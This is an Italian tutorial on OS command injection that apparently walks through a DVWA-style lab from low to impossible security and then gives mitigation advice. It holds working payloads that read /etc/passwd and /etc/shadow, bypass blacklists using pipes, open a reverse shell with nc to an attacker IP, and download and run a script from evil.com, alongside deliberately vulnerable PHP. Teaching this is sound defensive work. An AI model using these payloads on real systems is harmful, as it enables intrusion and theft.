💉 Command Injection

Esecuzione di comandi arbitrari sul sistema operativo tramite vulnerabilità di applicazioni web

📖 Cos'è la Command Injection?

Definizione

La Command Injection (o OS Command Injection) è una vulnerabilità che si verifica quando un'applicazione web esegue comandi del sistema operativo basandosi su input forniti dall'utente senza adeguata validazione o sanificazione.

Un attaccante può sfruttare questa vulnerabilità per eseguire comandi arbitrari sul server, ottenendo accesso non autorizzato, rubando dati, installando malware o compromettendo completamente il sistema.

Come Funziona?

Le applicazioni web spesso devono eseguire comandi di sistema per funzioni specifiche (es. ping, traceroute, conversione file). Se l'input dell'utente viene concatenato direttamente nel comando senza validazione, l'attaccante può iniettare comandi aggiuntivi.

Esempio Vulnerabile:

// PHP vulnerabile
$target = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $target);

Input Malevolo:

127.0.0.1; cat /etc/passwd

Comando Eseguito:

ping -c 4 127.0.0.1; cat /etc/passwd

Metacaratteri di Concatenazione dei Comandi

I metacaratteri shell permettono di concatenare più comandi:

  • ; - Esegue il comando successivo indipendentemente dal risultato del precedente
  • && - Esegue il comando successivo solo se il precedente ha successo
  • || - Esegue il comando successivo solo se il precedente fallisce
  • | - Pipe: passa l'output del primo comando come input del secondo
  • `comando` - Command substitution (backticks)
  • $(comando) - Command substitution (sintassi moderna)
  • & - Esegue il comando in background
  • \n - Newline (può separare comandi)

Low Security Vulnerabilità e Sfruttamento

⚠️ Vulnerabilità: Il codice prende l'input dell'utente e lo passa direttamente alla funzione shell_exec() senza alcuna validazione o sanificazione.

Codice Vulnerabile (Concettuale):

$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);
echo $cmd;

🎯 Metodo 1: Usando il Punto e Virgola (;)

Il punto e virgola permette di eseguire comandi sequenziali:

Payload:

127.0.0.1 ; cat /etc/passwd

💡 Risultato:

Vengono eseguiti entrambi i comandi:
1. ping -c 4 127.0.0.1 (esegue il ping)
2. cat /etc/passwd (visualizza il file delle password)

L'output mostrerà sia i risultati del ping che il contenuto del file /etc/passwd, che contiene informazioni sugli account utente del sistema.

🎯 Metodo 2: Usando l'Operatore AND (&&)

L'operatore AND esegue il secondo comando solo se il primo ha successo:

Payload:

127.0.0.1 && cat /etc/passwd

💡 Differenza con il Punto e Virgola:

Con &&, il secondo comando viene eseguito SOLO se il primo ha successo (exit code 0). Questo è utile per creare payload condizionali.

🎯 Altri Comandi Pericolosi

# Elencare file nella directory corrente
127.0.0.1 ; ls -la

# Visualizzare il contenuto di file sensibili
127.0.0.1 ; cat /etc/shadow

# Scoprire l'utente corrente
127.0.0.1 ; whoami

# Ottenere informazioni di sistema
127.0.0.1 ; uname -a

# Creare una reverse shell
127.0.0.1 ; nc -e /bin/bash attacker_ip 4444

# Scaricare ed eseguire malware
127.0.0.1 ; wget http://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh

Medium Security Protezioni Implementate

🛡️ Nuove Difese: È stata aggiunta la funzione str_replace() che sostituisce i metacaratteri && e ; con spazi vuoti.

Codice di Protezione (Concettuale):

$target = $_REQUEST['ip'];
$target = str_replace("&&", "", $target);
$target = str_replace(";", "", $target);
$cmd = shell_exec('ping -c 4 ' . $target);

🎯 Bypass: Usando il Pipe (|)

La blacklist non include il carattere pipe |, che possiamo sfruttare per bypassare la protezione.

Payload:

127.0.0.1 | cat /etc/passwd

💡 Spiegazione:

Il pipe | passa l'output del comando ping come input al comando cat /etc/passwd. Anche se il comportamento è leggermente diverso, otteniamo comunque l'esecuzione del comando desiderato.

Lezione: Le blacklist sono inefficaci perché è impossibile elencare tutti i possibili metacaratteri e encoding. Serve una whitelist!

High Security Protezioni Avanzate

🛡️ Difese Aggiunte: La blacklist è stata estesa per includere più metacaratteri: &, ;, e | (con spazio dopo).

Codice di Protezione (Concettuale):

$target = $_REQUEST['ip'];
$target = str_replace("& ", "", $target);
$target = str_replace("; ", "", $target);
$target = str_replace("| ", "", $target);
$cmd = shell_exec('ping -c 4 ' . $target);

🎯 Bypass: Pipe Senza Spazio

La funzione str_replace() cerca il pattern con lo spazio dopo il pipe. Possiamo bypassarla rimuovendo lo spazio.

Payload:

127.0.0.1 |cat /etc/passwd

💡 Spiegazione:

Senza lo spazio dopo il pipe, il pattern "| " non viene trovato dalla str_replace(), quindi il payload passa indenne.

La shell interpreta correttamente |cat come pipe seguito dal comando cat, quindi l'attacco funziona perfettamente.

Lezione: Anche le blacklist più complete hanno falle. È fondamentale validare positivamente l'input (whitelist).

Impossible Implementazione Sicura

✅ Difesa Corretta: L'indirizzo IP viene validato rigorosamente usando una whitelist. Viene suddiviso in 4 segmenti numerici e riassemblato.

Approccio Sicuro (Concettuale):

$target = $_REQUEST['ip'];

// Suddivide l'IP in 4 parti
$octet = explode(".", $target);

// Valida che ci siano esattamente 4 segmenti
if (count($octet) == 4) {
    // Valida che ogni segmento sia un numero tra 0 e 255
    for ($i = 0; $i < 4; $i++) {
        if (!is_numeric($octet[$i]) || $octet[$i] < 0 || $octet[$i] > 255) {
            exit("Invalid IP");
        }
    }
    // Riassembla l'IP validato
    $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
    $cmd = shell_exec('ping -c 4 ' . $target);
} else {
    exit("Invalid IP format");
}

💡 Perché Funziona:

  • ✅ Valida il formato esatto dell'IP (4 ottetti separati da punti)
  • ✅ Verifica che ogni ottetto sia numerico e nel range 0-255
  • ✅ Ricostruisce l'IP da componenti validati (nessun carattere extra)
  • ✅ Qualsiasi metacarattere viene rifiutato nella fase di validazione

Importante: Questo è un esempio di input validation corretta usando una whitelist invece di una blacklist.

🛡️ Strategie di Mitigazione

1. Input Validation con Whitelist

  • Validare formato: Usare regex o funzioni specifiche per validare il formato atteso
  • Whitelist di caratteri: Permettere solo caratteri alfanumerici e specifici necessari
  • Range checking: Verificare che i valori numerici siano nel range valido
  • Rifiutare invece di sanificare: Se l'input non è valido, rifiutarlo completamente

2. Evitare l'Esecuzione Diretta di Comandi

  • Usare API native: Invece di shell_exec("ping $ip"), usare librerie native
  • Funzioni specifiche: Preferire funzioni built-in del linguaggio
  • Parametrizzazione: Se devi eseguire comandi, usa interfacce parametrizzate

Esempio Sicuro (PHP):

// Invece di shell_exec con input utente
// Usa escapeshellarg() o escapeshellcmd()
$target = escapeshellarg($_REQUEST['ip']);
$cmd = shell_exec("ping -c 4 " . $target);

3. Principle of Least Privilege

  • User con privilegi minimi: Eseguire il server web con un utente non privilegiato
  • Chroot jail: Isolare l'ambiente di esecuzione
  • Containers: Usare Docker o altre tecnologie di containerizzazione
  • SELinux/AppArmor: Applicare policy di sicurezza a livello OS

4. Funzioni di Escaping

Se DEVI eseguire comandi di sistema, usa funzioni di escaping:

  • PHP: escapeshellarg(), escapeshellcmd()
  • Python: Usare subprocess con array di argomenti
  • Node.js: child_process.execFile() invece di exec()
  • Java: ProcessBuilder con array di argomenti

Esempio Python Sicuro:

# INSICURO
os.system("ping -c 4 " + user_input)

# SICURO
import subprocess
subprocess.run(["ping", "-c", "4", user_input])

5. Monitoring e Detection

  • Logging: Loggare tutti i comandi eseguiti dal web server
  • IDS/IPS: Implementare sistemi di rilevamento/prevenzione intrusioni
  • WAF: Web Application Firewall con regole per command injection
  • Anomaly Detection: Rilevare pattern anomali di esecuzione comandi

6. Architettura Sicura

  • Separazione dei livelli: Non eseguire comandi OS dal livello web
  • API Gateway: Centralizzare e validare tutte le richieste
  • Microservizi isolati: Limitare il blast radius di una compromissione
  • Immutable infrastructure: Rendere difficile la persistenza di malware

📌 Riepilogo

La Command Injection è una delle vulnerabilità più critiche perché permette l'esecuzione arbitraria di codice sul server. Le blacklist sono inefficaci; la difesa richiede validation rigorosa con whitelist, preferenza per API native, e architetture che minimizzano l'esecuzione di comandi OS.

Regola d'oro: Mai fidarsi dell'input utente. Sempre validare, sempre sanificare, e quando possibile, evitare completamente l'esecuzione di comandi di sistema.
